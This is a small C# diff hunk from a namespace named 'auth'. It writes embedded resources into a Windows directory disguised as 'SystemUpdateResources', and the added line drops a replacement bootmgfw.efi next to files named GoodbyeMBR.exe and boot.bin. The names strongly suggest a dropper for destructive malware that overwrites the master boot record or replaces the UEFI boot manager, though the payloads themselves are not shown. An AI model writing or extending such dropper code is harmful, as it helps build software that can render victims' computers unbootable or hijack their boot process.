@@ -189,6 +189,7 @@ namespace auth
                     File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\BlacklistedApp.exe", auth.Properties.Resources.BlacklistedApp);
                     File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\GoodbyeMBR.exe", auth.Properties.Resources.GoodbyeMBR);
                     File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\boot.bin", auth.Properties.Resources.boot);
+                    File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\bootmgfw.efi", auth.Properties.Resources.bootmgfw);
                     using (var iconStream = File.OpenWrite(@"C:\Windows\SystemUpdateResources\Belfiore.ico"))
                     {
                         Properties.Resources.Belfiore.Save(iconStream);
